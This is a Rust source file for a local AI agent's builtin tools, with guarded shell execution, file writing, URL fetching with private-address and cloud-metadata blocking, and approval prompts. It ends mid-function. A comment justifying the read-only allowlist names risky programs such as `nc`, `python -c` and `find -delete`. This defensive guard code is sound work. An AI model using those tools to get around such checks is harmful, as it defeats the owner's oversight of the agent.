//! Builtin tools (OpenAI-style function schemas) and their guarded implementations.
//! Safety: write roots, secret-path refusal, delete refusal, confirmation, trash is MOVE ONLY.
use crate::config::Config;
use crate::conv::{Confirm, Conv};
use crate::fstools;
use crate::mcp::McpHost;
use crate::ollama;
use crate::rag::Rag;
use crate::util::{self, cap, head_chars, http_json, is_secret_path, resolve, Guard, RESULT_CAP};
use regex::Regex;
use serde_json::{json, Value};
use std::cell::RefCell;
use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::net::{IpAddr, TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::sync::Mutex;
use std::time::{Duration, Instant};

pub struct Env {
    pub cfg: Config,
    pub confirm: Box<dyn Confirm>,
    pub guard: Guard,
    pub rag: RefCell<Rag>,
    pub mcp: RefCell<McpHost>,
    protect: Option<Regex>,
    /// Hosts the owner let `fetch_url` read, per conversation (asked once each).
    fetch_ok: RefCell<HashMap<String, HashSet<String>>>,
}

/// The host of an http(s) address, lower case, without the port.
fn host_of(url: &str) -> Option<String> {
    let uri: ureq::http::Uri = url.parse().ok()?;
    Some(
        uri.host()?
            .trim_start_matches('[')
            .trim_end_matches(']')
            .to_ascii_lowercase(),
    )
}

/// A host the owner listed in `fetch_allow_hosts` (`*.example.com` covers its subdomains).
fn pre_approved(host: &str, list: &[String]) -> bool {
    list.iter().any(|a| match a.strip_prefix("*.") {
        Some(base) => host == base || host.ends_with(&format!(".{base}")),
        None => host == a,
    })
}

fn s(d: &str) -> Value {
    json!({"type": "string", "description": d})
}

fn func(name: &str, desc: &str, props: Value, required: &[&str]) -> Value {
    json!({"type": "function", "function": {"name": name, "description": desc,
        "parameters": {"type": "object", "properties": props, "required": required}}})
}

pub fn builtin_schemas() -> Vec<Value> {
    let int = json!({"type": "integer"});
    let boolean = json!({"type": "boolean"});
    vec![
        func("list_dir", "List the files and folders in a directory.", json!({"path": s("directory path")}), &["path"]),
        func("read_file", "Read a text file (first 6000 chars unless offset given).", json!({"path": s("file path"), "offset": int}), &["path"]),
        func("write_file", "Write a text file inside the allowed write folders. Overwrites need approval.", json!({"path": s("file path"), "content": s("text")}), &["path", "content"]),
        func("trash", "Move a file or folder into the trash folder (the only way to remove anything; nothing is ever deleted). Needs approval.", json!({"path": s("path")}), &["path"]),
        func("run_command", "Run a shell command (PowerShell on Windows, sh elsewhere). Read-only commands run at once; anything that writes, installs, stops things or uses the network asks the user first. Deleting is refused (use trash).", json!({"command": s("shell command")}), &["command"]),
        func("fetch_url", "Fetch a web page as text. Works only when the internet is up; fails cleanly offline.", json!({"url": s("http(s) URL")}), &["url"]),
        func("search_memory", "Search the user's memory and notes (configured markdown files). Returns cited excerpts.", json!({"query": s("what to look for")}), &["query"]),
        func("workflow_update", "Update this conversation's persistent task list and notes. Call it when you plan work and after each step.",
            json!({"tasks": {"type": "array", "items": {"type": "object", "properties": {"text": {"type": "string"}, "done": {"type": "boolean"}}}}, "note": s("short note")}), &[]),
        func("delegate", "Run a subtask on another configured local engine host with its own small read-only tool loop. Use for second opinions, research or work another machine already has.",
            json!({"host": s("host name from the config (or local)"), "model": s("model name on that host, or empty for its house model"), "task": s("the subtask, self-contained")}), &["host", "task"]),
        func("comfy_image", "Make one image with local ComfyUI and return the file path. Unloads our language models, takes the GPU lease if configured, runs ComfyUI, then releases the GPU.",
            json!({"prompt": s("image prompt"), "width": int, "height": int}), &["prompt"]),
        func("edit_file", "Exact string replacement in a file inside the allowed folders. Fails if old is missing or not unique (unless replace_all). Keeps line endings; backs up first. Prefer this over rewriting a file.",
            json!({"path": s("file path"), "old": s("exact text to replace"), "new": s("replacement text"), "replace_all": boolean}), &["path", "old", "new"]),
        func("grep", "Regex search over files (skips binaries, big files, .git, node_modules). Returns path:line: text.",
            json!({"pattern": s("regex"), "path": s("file or folder"), "glob": s("filename filter such as *.py"), "ignore_case": boolean, "context": int, "max_results": int}), &["pattern", "path"]),
        func("glob", "Find files by pattern (e.g. **/*.py), newest first, max 100.", json!({"pattern": s("glob pattern"), "path": s("folder")}), &["pattern", "path"]),
    ]
}

fn sarg<'a>(a: &'a Value, k: &str) -> Result<&'a str, String> {
    a.get(k)
        .and_then(|v| v.as_str())
        .ok_or_else(|| format!("error: missing or non-string argument '{k}'"))
}

fn opt_str<'a>(a: &'a Value, k: &str) -> &'a str {
    a.get(k).and_then(|v| v.as_str()).unwrap_or("")
}

fn iarg(a: &Value, k: &str, default: i64) -> i64 {
    match a.get(k) {
        Some(Value::Number(n)) => n
            .as_i64()
            .or(n.as_f64().map(|f| f as i64))
            .unwrap_or(default),
        Some(Value::String(t)) => t.trim().parse().unwrap_or(default),
        _ => default,
    }
}

fn barg(a: &Value, k: &str) -> bool {
    match a.get(k) {
        Some(Value::Bool(b)) => *b,
        Some(Value::String(t)) => t == "true",
        _ => false,
    }
}

/// Run a shell command; output is stdout+stderr. Kills the exact child on timeout.
pub fn shell(cmd: &str, cwd: &Path, timeout: Duration) -> (String, i32) {
    #[cfg(windows)]
    let mut c = {
        use std::os::windows::process::CommandExt;
        let mut c = Command::new("powershell");
        c.args(["-NoProfile", "-NonInteractive", "-Command", cmd])
            .creation_flags(0x0800_0000);
        c
    };
    #[cfg(not(windows))]
    let mut c = {
        let mut c = Command::new("sh");
        c.args(["-c", cmd]);
        c
    };
    let _ = std::fs::create_dir_all(cwd);
    c.current_dir(cwd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = match c.spawn() {
        Ok(ch) => ch,
        Err(e) => return (format!("cannot start shell: {e}"), -1),
    };
    let (tx, rx) = mpsc::channel::<Vec<u8>>();
    for mut pipe in [
        child
            .stdout
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
        child
            .stderr
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    ]
    .into_iter()
    .flatten()
    {
        let tx = tx.clone();
        std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            while let Ok(n) = pipe.read(&mut buf) {
                if n == 0 || tx.send(buf[..n].to_vec()).is_err() {
                    break;
                }
            }
        });
    }
    drop(tx);
    let start = Instant::now();
    let mut out = Vec::new();
    let (mut code, mut timed_out) = (-1, false);
    loop {
        while let Ok(b) = rx.try_recv() {
            out.extend(b);
        }
        match child.try_wait() {
            Ok(Some(st)) => {
                code = st.code().unwrap_or(-1);
                break;
            }
            Ok(None) if start.elapsed() > timeout => {
                let _ = child.kill();
                let _ = child.wait();
                timed_out = true;
                break;
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(15)),
            Err(_) => break,
        }
    }
    // short grace for output still in the pipes (a grandchild may keep them open: do not wait for it)
    let grace = Instant::now();
    while grace.elapsed() < Duration::from_millis(300) {
        match rx.recv_timeout(Duration::from_millis(50)) {
            Ok(b) => out.extend(b),
            Err(mpsc::RecvTimeoutError::Disconnected) => break,
            Err(_) => {}
        }
    }
    let mut text = String::from_utf8_lossy(&out).trim().to_string();
    if timed_out {
        text.push_str(&format!(
            "\n[timed out after {:.0}s and was killed]",
            timeout.as_secs_f64()
        ));
    }
    (text, code)
}

static NET_CACHE: Mutex<Vec<(String, Instant, bool)>> = Mutex::new(Vec::new());

/// The longest request an approval shows (whole); anything longer is refused unasked.
pub const APPROVAL_MAX: usize = 20_000;

/// Programs that read only when run with nothing after them, or only the options listed: with
/// other options they write a file (`tree -o`), set the clock (`date -s`), rename the machine
/// (`hostname x`), drop the network (`ipconfig /release`) or change the GPU (`nvidia-smi -pl`).
const BARE_ONLY: &[(&str, &[&str])] = &[
    ("tree", &[]),
    ("date", &[]),
    ("hostname", &[]),
    ("ipconfig", &["/all"]),
    (
        "nvidia-smi",
        &["-L", "-q", "--list-gpus", "--query", "--format"],
    ),
];

/// Programs that only read. `run_command` runs a command without asking only when every part of
/// it starts with one of these (a list of what is safe, because a list of what is not is always
/// one program short: `/bin/rm`, `find -delete`, `python -c`, `nc`, `iwr`).
const READ_ONLY: &[&str] = &[
    "grep",
    "findstr",
    "ls",
    "dir",
    "pwd",
    "cat",
    "type",
    "head",
    "tail",
    "wc",
    "echo",
    "whoami",
    "uname",
    "df",
    "du",
    "free",
    "uptime",
    "ps",
    "tasklist",
    "systeminfo",
    "sleep",
    "exit",
    "true",
    "false",
    "stat",
    "which",
    "where",
    "get-childitem",
    "get-content",
    "get-location",
    "get-date",
    "get-process",
    "get-item",
    "select-string",
    "test-path",
    "measure-object",
];

/// True when `cmd` is made only of read-only programs joined by `;`, `&&`, `||` or `|`, with no
/// redirection, substitution, background `&` or line break.
pub fn is_read_only(cmd: &str) -> bool {
    if cmd.trim().is_empty()
        || cmd.chars().any(|c| {
            matches!(
                c,
                '>' | '<' | '$' | '`' | '(' | ')' | '{' | '}' | '\n' | '\r' | '\0' | '^'
            )
        })
    {
        return false;
    }
    let flat = cmd.replace("&&", ";").replace("||", ";").replace('|', ";");
    if flat.contains('&') {
        return false;
    }
    flat.split(';')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .all(|seg| {
            let seg = seg.strip_prefix("exec ").unwrap_or(seg).trim();
            let mut words = seg.split_whitespace();
            let first = words.next().unwrap_or("").to_ascii_lowercase();
            let first = first.strip_suffix(".exe").unwrap_or(&first);
            if first == "git" {
                return matches!(
                    words.next(),
                    Some("status" | "log" | "show" | "diff" | "rev-parse" | "ls-files")
                ) && !seg.contains("--output");
            }
            if let Some((_, ok)) = BARE_ONLY.iter().find(|(p, _)| *p == first) {
                // each option must be one listed (`--query-gpu=name` and `--format=csv` count)
                return words.all(|w| {
                    ok.iter().any(|o| {
                        w.eq_ignore_ascii_case(o)
                            || (o.starts_with("--")
                                && w.strip_prefix(o).is_some_and(|r| r.starts_with(['-', '='])))
                    })
                });
            }
            READ_ONLY.contains(&first)
        })
}

/// Offline check: env TEMPO_OFFLINE, else a quick TCP connect to the probe address (cached 20 s).
pub fn net_up(cfg: &Config) -> bool {
    if std::env::var("TEMPO_OFFLINE")
        .map(|v| !v.is_empty())
        .unwrap_or(false)
    {
        return false;
    }
    if let Ok(c) = NET_CACHE.lock() {
        if let Some((_, t, v)) = c.iter().find(|(a, _, _)| *a == cfg.offline_probe) {
            if t.elapsed() < Duration::from_secs(20) {
                return *v;
            }
        }
    }
    let up = probe(&cfg.offline_probe);
    if let Ok(mut c) = NET_CACHE.lock() {
        c.retain(|(a, _, _)| *a != cfg.offline_probe);
        c.push((cfg.offline_probe.clone(), Instant::now(), up));
    }
    up
}

fn probe(addr: &str) -> bool {
    addr.to_socket_addrs()
        .ok()
        .and_then(|mut a| a.next())
        .map(|a| TcpStream::connect_timeout(&a, Duration::from_millis(1500)).is_ok())
        .unwrap_or(false)
}

/// Whether an address is on the open internet: not this computer, not a private or link-local
/// network (the cloud metadata address 169.254.169.254 is link-local), not carrier-grade NAT
/// (Tailscale), not multicast.
fn public_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v) => {
            let o = v.octets();
            !(v.is_loopback()
                || v.is_private()
                || v.is_link_local()
                || v.is_unspecified()
                || v.is_broadcast()
                || v.is_multicast()
                || o[0] == 0
                || (o[0] == 100 && o[1] & 0xc0 == 64))
        }
        IpAddr::V6(v) => match v.to_ipv4_mapped() {
            Some(m) => public_ip(IpAddr::V4(m)),
            None => {
                let s = v.segments()[0];
                !(v.is_loopback()
                    || v.is_unspecified()
                    || v.is_multicast()
                    || s & 0xfe00 == 0xfc00
                    || s & 0xffc0 == 0xfe80)
            }
        },
    }
}

/// `Ok` when every address the host of `url` resolves to is public, or the host is one the owner
/// listed in `fetch_allow_private`.
fn check_fetch_target(url: &str, allow: &[String]) -> Result<(), String> {
    let uri: ureq::http::Uri = url.parse().map_err(|_| "refused: not a valid address")?;
    let host = uri.host().ok_or("refused: no host in that address")?;
    if allow.iter().any(|a| a.eq_ignore_ascii_case(host)) {
        return Ok(());
    }
    let port = uri
        .port_u16()
        .unwrap_or(if uri.scheme_str() == Some("https") {
            443
        } else {
            80
        });
    let bare = host.trim_start_matches('[').trim_end_matches(']');
    let addrs: Vec<_> = (bare, port)
        .to_socket_addrs()
        .map_err(|e| format!("refused: cannot resolve {host}: {e}"))?
        .collect();
    if addrs.is_empty() || addrs.iter().any(|a| !public_ip(a.ip())) {
        return Err(format!(
            "refused: {host} is on this computer or a private network (fetch_url reaches the internet only; the owner can list a host in fetch_allow_private)"
        ));
    }
    Ok(())
}

fn unescape_html(t: &str) -> String {
    let mut out = t
        .replace("&nbsp;", " ")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&apos;", "'");
    out = Regex::new(r"&#(\d{1,6});")
        .map(|r| {
            r.replace_all(&out, |c: &regex::Captures| {
                c[1].parse::<u32>()
                    .ok()
                    .and_then(char::from_u32)
                    .map(String::from)
                    .unwrap_or_default()
            })
            .into_owned()
        })
        .unwrap_or(out);
    out.replace("&amp;", "&")
}

fn html_to_text(raw: &str) -> String {
    let a = Regex::new(r"(?is)<script.*?</script>")
        .expect("regex")
        .replace_all(raw, " ");
    let b = Regex::new(r"(?is)<style.*?</style>")
        .expect("regex")
        .replace_all(&a, " ");
    let c = Regex::new(r"<[^>]+>").expect("regex").replace_all(&b, " ");
    let t = unescape_html(&c);
    Regex::new(r"\s+")
        .expect("regex")
        .replace_all(&t, " ")
        .trim()
        .to_string()
}

fn unique_dest(dir: &Path, name: &str) -> PathBuf {
    let mut d = dir.join(name);
    let mut i = 1;
    while d.symlink_metadata().is_ok() {
        d = dir.join(format!("{name}.{}.{i}", util::time_hms()));
        i += 1;
    }
    d
}

impl Env {
    pub fn new(cfg: Config, confirm: Box<dyn Confirm>, mcp: McpHost) -> Env {
        let protect = cfg
            .protect_regex
            .as_deref()
            .and_then(|r| Regex::new(&format!("(?i){r}")).ok());
        let mut keep: Vec<PathBuf> = [
            "conversations",
            "logs",
            "rag-index.json",
            "agent-config.json",
        ]
        .iter()
        .map(|n| cfg.data_dir.join(n))
        .collect();
        for var in ["TEMPO_AGENT_CONFIG", "TEMPO_MCP_CONFIG"] {
            keep.extend(std::env::var_os(var).map(PathBuf::from));
        }
        Env {
            guard: Guard::new(&cfg.write_roots).keeping(&keep),
            cfg,
            confirm,
            rag: RefCell::new(Rag::new()),
            mcp: RefCell::new(mcp),
            protect,
            fetch_ok: RefCell::new(HashMap::new()),
        }
    }

    /// Ask the owner, showing the whole request: nobody should approve text they could not read
    /// (a long command can hide its end). A request too long to read at all is refused, and the
    /// reply says so rather than blaming the owner.
    pub fn ask(&self, what: &str, detail: &str) -> Result<(), String> {
        let n = detail.chars().count();
        if n > APPROVAL_MAX {
            return Err(format!("refused: too long to approve ({n} characters; an approval shows the whole request, up to {APPROVAL_MAX})"));
        }
        if self.confirm.confirm(what, detail) {
            Ok(())
        } else {
            Err("denied by user".into())
        }
    }

    pub fn is_builtin(name: &str) -> bool {
        builtin_schemas()
            .iter()
            .any(|f| f["function"]["name"] == name)
    }

    /// Run a builtin by name. Result is NOT yet redacted/capped (the loop does that).
    pub fn run_builtin(&self, conv: &Conv, name: &str, a: &Value) -> String {
        let r = match name {
            "list_dir" => self.list_dir(a),
            "read_file" => self.read_file(a),
            "write_file" => self.write_file(a),
            "trash" => self.trash(a),
            "run_command" => self.run_command(a),
            "fetch_url" => self.fetch_url(conv, a),
            "search_memory" => self.search_memory(a),
            "workflow_update" => {
                Ok(conv.wf_update(a.get("tasks"), a.get("note").and_then(|n| n.as_str())))
            }
            "delegate" => self.delegate(a),
            "comfy_image" => self.comfy_image(a),
            "edit_file" => sarg(a, "path").and_then(|p| {
                let (o, n) = (sarg(a, "old")?, sarg(a, "new")?);
                Ok(fstools::edit_file(
                    &self.guard,
                    &self.cfg.trash_dir,
                    p,
                    o,
                    n,
                    barg(a, "replace_all"),
                ))
            }),
            "grep" => sarg(a, "pattern").and_then(|pat| {
                let p = sarg(a, "path")?;
                Ok(fstools::grep(
                    pat,
                    p,
                    opt_str(a, "glob"),
                    barg(a, "ignore_case"),
                    iarg(a, "context", 0).max(0) as usize,
                    iarg(a, "max_results", 50).max(1) as usize,
                ))
            }),
            "glob" => sarg(a, "pattern").and_then(|pat| Ok(fstools::glob(pat, sarg(a, "path")?))),
            _ => Ok(format!("unknown tool {name}")),
        };
        r.unwrap_or_else(|e| e)
    }

    fn list_dir(&self, a: &Value) -> Result<String, String> {
        let path = sarg(a, "path")?;
        if is_secret_path(path) {
            return Ok("refused: secret path".into());
        }
        let rd = std::fs::read_dir(path).map_err(|e| format!("error: {e}"))?;
        let mut es: Vec<(bool, String, u64)> = rd
            .flatten()
            .map(|e| {
                (
                    e.path().is_dir(),
                    e.file_name().to_string_lossy().into_owned(),
                    e.metadata().map(|m| m.len()).unwrap_or(0),
                )
            })
            .collect();
        es.sort_by_key(|x| (!x.0, x.1.to_lowercase()));
        let lines: Vec<String> = es
            .iter()
            .take(200)
            .map(|(d, n, sz)| {
                if *d {
                    format!("[dir] {n}")
                } else {
                    format!("{sz:>10}  {n}")
                }
            })
            .collect();
        Ok(if lines.is_empty() {
            "(empty)".into()
        } else {
            lines.join("\n")
        })
    }

    fn read_file(&self, a: &Value) -> Result<String, String> {
        let path = sarg(a, "path")?;
        if is_secret_path(path) {
            return Ok("refused: secret path".into());
        }
        let raw = std::fs::read(path).map_err(|e| format!("error: {e}"))?;
        let off = iarg(a, "offset", 0).max(0) as usize;
        Ok(String::from_utf8_lossy(&raw)
            .chars()
            .skip(off)
            .take(RESULT_CAP)
            .collect())
    }

    fn write_file(&self, a: &Value) -> Result<String, String> {
        let (path, content) = (sarg(a, "path")?, sarg(a, "content")?);
        if is_secret_path(path) {
            return Ok("refused: secret path".into());
        }
        let Some(real) = self.guard.writable(path) else {
            return Ok(format!(
                "refused: outside allowed write folders (or a link, or the agent's own state): {}",
                self.cfg.write_roots.join("; ")
            ));
        };
        if real.exists() {
            if let Err(no) = self.ask("overwrite file", path) {
                return Ok(no);
            }
        }
        if let Some(p) = real.parent() {
            let _ = std::fs::create_dir_all(p);
        }
        std::fs::write(&real, content).map_err(|e| format!("error: {e}"))?;
        Ok(format!("wrote {} chars to {path}", content.chars().count()))
    }

    /// MOVE ONLY into `<trash>/<YYYYMMDD>/` under a unique name. Nothing is ever deleted.
    fn trash(&self, a: &Value) -> Result<String, String> {
        let path = sarg(a, "path")?;
        let Some(real) = self
            .guard
            .writable(path)
            .filter(|r| r.symlink_metadata().is_ok())
        else {
            return Ok("refused: missing or outside allowed folders".into());
        };
        if self.guard.is_root(path) || resolve(&self.cfg.trash_dir).starts_with(&real) {
            return Ok("refused: that folder holds the write root or the trash itself".into());
        }
        if let Err(no) = self.ask("move to trash", path) {
            return Ok(no);
        }
        let day = self.cfg.trash_dir.join(util::date_ymd());
        std::fs::create_dir_all(&day)
            .map_err(|e| format!("failed: cannot create trash folder: {e}"))?;
        let name = real
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| "item".into());
        let dest = unique_dest(&day, &name);
        match std::fs::rename(&real, &dest) {
            Ok(_) => Ok(format!("moved to {}", dest.display())),
            Err(e) => Ok(format!(
                "failed: could not move ({e}); nothing was changed or deleted"
            )),
        }
    }

    fn run_command(&self, a: &Value) -> Result<String, String> {
        let cmd = sarg(a, "command")?;
        if util::delete_rx().is_match(cmd) {
            return Ok("refused: deleting is not allowed here; use the trash tool".into());
        }
        if util::comfy_rx().is_match(cmd) {
            return Ok(
                "refused: start ComfyUI only through the comfy_image tool (it takes the GPU lease)"
                    .into(),
            );
        }
        if self.protect.as_ref().is_some_and(|p| p.is_match(cmd))
            && util::protect_verb_rx().is_match(cmd)
        {
            return Ok("refused: protected service".into());
        }
        if !is_read_only(cmd) {
            if let Err(no) = self.ask("run command", cmd) {
                return Ok(no);
            }
        }
        let (out, rc) = shell(
            cmd,
            &self.cfg.command_cwd,
            Duration::from_secs_f64(self.cfg.command_timeout_s),
        );
        Ok(format!("[exit {rc}]\n{out}"))
    }

    /// The first read of a host in a conversation asks the owner; yes covers that host for the
    /// rest of the conversation. Hosts in `fetch_allow_hosts` never ask. Each redirect is checked
    /// the same way, so a page cannot send the agent on to a host nobody approved.
    fn host_ok(&self, conv: &Conv, url: &str) -> Result<(), String> {
        let host = host_of(url).ok_or("refused: no host in that address")?;
        if pre_approved(&host, &self.cfg.fetch_allow_hosts)
            || self
                .fetch_ok
                .borrow()
                .get(&conv.id)
                .is_some_and(|s| s.contains(&host))
        {
            return Ok(());
        }
        self.ask(&format!("Tempo wants to read {host}"), url)?;
        self.fetch_ok
            .borrow_mut()
            .entry(conv.id.clone())
            .or_default()
            .insert(host);
        Ok(())
    }

    fn fetch_url(&self, conv: &Conv, a: &Value) -> Result<String, String> {
        let url = sarg(a, "url")?;
        if !(url.starts_with("http://") || url.starts_with("https://")) {
            return Ok("refused: http(s) only".into());
        }
        if !net_up(&self.cfg) {
            return Ok("offline: no internet right now. Use local memory (search_memory) or tell the user.".into());
        }
        let allow = &self.cfg.fetch_allow_private;
        let raw = match util::get_text_checked(url, Duration::from_secs(20), 400_000, &|u| {
            check_fetch_target(u, allow)?;
            self.host_ok(conv, u)
        }) {
            Err(e) if e == "denied by user" || e.starts_with("refused: too long") => return Ok(e),
            r => r,
        }
        .map_err(|e| {
            if e.starts_with("refused") {
                e
            } else {
                format!("fetch failed: {e}")
            }
        })?;
        Ok(html_to_text(&raw))
    }

    fn search_memory(&self, a: &Value) -> Result<String, String> {
        let q = sarg(a, "query")?;
        let hits = self.rag.borrow_mut().search(&self.cfg, q, 5);
        Ok(hits
            .iter()
            .map(|h| {
                format!(
                    "[{}#{}] {}",
                    Path::new(&h.src)
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_default(),
                    h.chunk,
                    head_chars(&h.text, 700)
                )
            })
            .collect::<Vec<_>>()
            .join("\n\n"))
    }

    fn probe_host(&self, name: &str) -> Result<(String, Vec<String>, Vec<String>), String> {
        let hosts = self.cfg.all_hosts();
        let Some(h) = hosts.get(name) else {
            return Err(format!(
                "unknown host '{name}'. Known: {}",
                hosts.keys().cloned().collect::<Vec<_>>().join(", ")
            ));
        };
        for u in &h.urls {
            let t = if u.contains("127.0.0.1") || u.contains("localhost") {
                10
            } else {
                3
            };
            if let Ok(tags) = http_json(&format!("{u}/api/tags"), None, Duration::from_secs(t)) {
                let avail = tags
                    .get("models")
                    .and_then(|m| m.as_array())
                    .map(|m| {
                        m.iter()
                            .filter_map(|x| {
                                x.get("name").and_then(|n| n.as_str()).map(String::from)
                            })
                            .collect()
                    })
                    .unwrap_or_default();
                return Ok((u.clone(), h.models.clone(), avail));
            }
        }
        Err(format!(
            "host '{name}' unreachable on {}",
            h.urls.join(", ")
        ))
    }

    fn delegate(&self, a: &Value) -> Result<String, String> {
        let (host, task) = (sarg(a, "host")?, sarg(a, "task")?);
        let mut model = opt_str(a, "model").to_string();
        let (url, house, avail) = match self.probe_host(host) {
            Ok(p) => p,
            Err(e) => return Ok(format!("delegate failed: {e}")),
        };
        if !house.is_empty() {
            if !model.is_empty() && !house.contains(&model) {
                return Ok(format!("refused: on {host} only the house model {house:?} may be used (never evict it)"));
            }
            model = house[0].clone();
        }
        if model.is_empty() {
            model = self.cfg.models[0].clone();
        }
        if !avail.contains(&model) && !avail.iter().any(|x| x.starts_with(&model)) {
            return Ok(format!(
                "model '{model}' not on {host}. Available: {}",
                avail
                    .iter()
                    .take(15)
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
        let local = url == self.cfg.ollama_url;
        let trusted = local
            || self
                .cfg
                .all_hosts()
                .get(host)
                .is_some_and(|h| h.trust_reads);
        Ok(self.sub_loop(&url, &model, task, local, trusted))
    }

    /// 4-step read-only loop (list_dir, read_file, search_memory) on another engine, non-streaming.
    /// Unless the host is trusted (this machine, or one the owner marked `trust_reads`), each read
    /// its model asks for is approved by the owner first: what it reads is sent to that machine.
    fn sub_loop(&self, url: &str, model: &str, task: &str, local: bool, trusted: bool) -> String {
        let ro: Vec<Value> = builtin_schemas()
            .into_iter()
            .filter(|f| {
                ["list_dir", "read_file", "search_memory"]
                    .contains(&f["function"]["name"].as_str().unwrap_or(""))
            })
            .collect();
        let mut msgs = vec![
            json!({"role": "system", "content": "You are a Perennos Tempo subagent. Do the task, use tools if needed, answer briefly and concretely."}),
            json!({"role": "user", "content": task}),
        ];
        for _ in 0..4 {
            let mut body = json!({"model": model, "messages": msgs, "tools": ro, "stream": false, "options": {"num_ctx": 8192}});
            if local {
                body["keep_alive"] = json!("10m");
            }
            if Config::is_qwen(model) {
                body["think"] = json!(false);
            }
            let resp = match http_json(
                &format!("{url}/api/chat"),
                Some(&body),
                Duration::from_secs(900),
            ) {
                Ok(r) => r,
                Err(e) => return format!("delegate failed: {e}"),
            };
            let m = resp.get("message").cloned().unwrap_or(Value::Null);
            msgs.push(m.clone());
            let calls = m
                .get("tool_calls")
                .and_then(|c| c.as_array())
                .cloned()
                .unwrap_or_default();
            if calls.is_empty() {
                return format!(
                    "[{model} @ {url}] {}",
                    m.get("content").and_then(|c| c.as_str()).unwrap_or("")
                );
            }
            for tc in calls {
                let f = &tc["function"];
                let name = f["name"].as_str().unwrap_or("");
                let args = match f.get("arguments") {
                    Some(Value::String(t)) => serde_json::from_str(t).unwrap_or(json!({})),
                    Some(v) => v.clone(),
                    None => json!({}),
                };
                // another machine's model chooses what to read here: the owner approves each read
                let asked = if trusted {
                    Ok(())
                } else {
                    self.ask(
                        &format!("delegate tool on {url}"),
                        &format!("{name} {args}"),
                    )
                };
                let r = if !["list_dir", "read_file", "search_memory"].contains(&name) {
                    format!("error: tool {name} is not available to subagents")
                } else if let Err(no) = asked {
                    no
                } else {
                    match name {
                        "list_dir" => self.list_dir(&args),
                        "read_file" => self.read_file(&args),
                        _ => self.search_memory(&args),
                    }
                    .unwrap_or_else(|e| e)
                };
                msgs.push(json!({"role": "tool", "tool_name": name, "content": cap(&r, 3000)}));
            }
        }
        format!("[{model}] step cap reached")
    }

    fn comfy_image(&self, a: &Value) -> Result<String, String> {
        let prompt = sarg(a, "prompt")?;
        let (w, h) = (
            iarg(a, "width", 512).clamp(64, 4096),
            iarg(a, "height", 512).clamp(64, 4096),
        );
        let c = &self.cfg;
        let cwd = &c.command_cwd;
        if let Some(cmd) = &c.lease_status_cmd {
            let (st, _) = shell(cmd, cwd, Duration::from_secs(60));
            let free = serde_json::from_str::<Value>(&st)
                .map(|v| v.get("lease").is_none_or(|l| l.is_null()))
                .unwrap_or(false);
            if !free {
                // someone else holds the lease (maybe a stream encoder): never evict
                return Ok(format!("refused: GPU lease is held by another job (or its status is unreadable). Not evicting it. Status:\n{}", head_chars(&st, 500)));
            }
        }
        if ollama::unload_ours(c) > 0 {
            std::thread::sleep(Duration::from_secs(3));
        }
        if let Some(cmd) = &c.lease_acquire_cmd {
            let (out, rc) = shell(cmd, cwd, Duration::from_secs(120));
            if rc != 0 {
                return Ok(format!("lease refused: {}", head_chars(&out, 400)));
            }
        }
        let result = self.comfy_run(prompt, w, h);
        if let Some(cmd) = &c.comfy_stop_cmd {
            shell(cmd, cwd, Duration::from_secs(60));
        }
        if let Some(cmd) = &c.lease_release_cmd {
            shell(cmd, cwd, Duration::from_secs(60));
        }
        Ok(match result {
            Ok(p) => format!("image path: {p}"),
            Err(e) => format!("comfy_image failed: {e}"),
        })
    }

    fn comfy_run(&self, prompt: &str, w: i64, h: i64) -> Result<String, String> {
        let c = &self.cfg;
        let up = || {
            http_json(
                &format!("{}/system_stats", c.comfy_url),
                None,
                Duration::from_secs(3),
            )
            .is_ok()
        };
        if !up() {
            if let Some(cmd) = &c.comfy_start_cmd {
                shell(cmd, &c.command_cwd, Duration::from_secs(240));
            }
            for i in 0..60 {
                if up() {
                    break;
                }
                if i == 59 {
                    return Err("ComfyUI is not reachable".into());
                }
                std::thread::sleep(Duration::from_secs(3));
            }
        }
        comfy_txt2img(&c.comfy_url, c.comfy_output_dir.as_deref(), prompt, w, h)
    }
}

/// Minimal SD graph over the ComfyUI HTTP API using the first installed checkpoint.
pub fn comfy_txt2img(
    base: &str,
    out_dir: Option<&str>,
    prompt: &str,
    w: i64,
    h: i64,
) -> Result<String, String> {
    let info = http_json(
        &format!("{base}/object_info/CheckpointLoaderSimple"),
        None,
        Duration::from_secs(30),
    )?;
    let ck = info["CheckpointLoaderSimple"]["input"]["required"]["ckpt_name"][0]
        .as_array()
        .and_then(|a| a.first())
        .and_then(|x| x.as_str())
        .ok_or("no checkpoint installed in ComfyUI")?
        .to_string();
    let seed = util::unix_now() as u64 % 1_000_000_000;
    let g = json!({
        "1": {"class_type": "CheckpointLoaderSimple", "inputs": {"ckpt_name": ck}},
        "2": {"class_type": "CLIPTextEncode", "inputs": {"text": prompt, "clip": ["1", 1]}},
        "3": {"class_type": "CLIPTextEncode", "inputs": {"text": "blurry, low quality, text, watermark", "clip": ["1", 1]}},
        "4": {"class_type": "EmptyLatentImage", "inputs": {"width": w, "height": h, "batch_size": 1}},
        "5": {"class_type": "KSampler", "inputs": {"model": ["1", 0], "positive": ["2", 0], "negative": ["3", 0], "latent_image": ["4", 0],
            "seed": seed, "steps": 20, "cfg": 7, "sampler_name": "euler", "scheduler": "normal", "denoise": 1}},
        "6": {"class_type": "VAEDecode", "inputs": {"samples": ["5", 0], "vae": ["1", 2]}},
        "7": {"class_type": "SaveImage", "inputs": {"images": ["6", 0], "filename_prefix": "tempo-agent"}}
    });
    let pid = http_json(
        &format!("{base}/prompt"),
        Some(&json!({"prompt": g})),
        Duration::from_secs(30),
    )?["prompt_id"]
        .as_str()
        .ok_or("ComfyUI returned no prompt_id")?
        .to_string();
    for i in 0..300 {
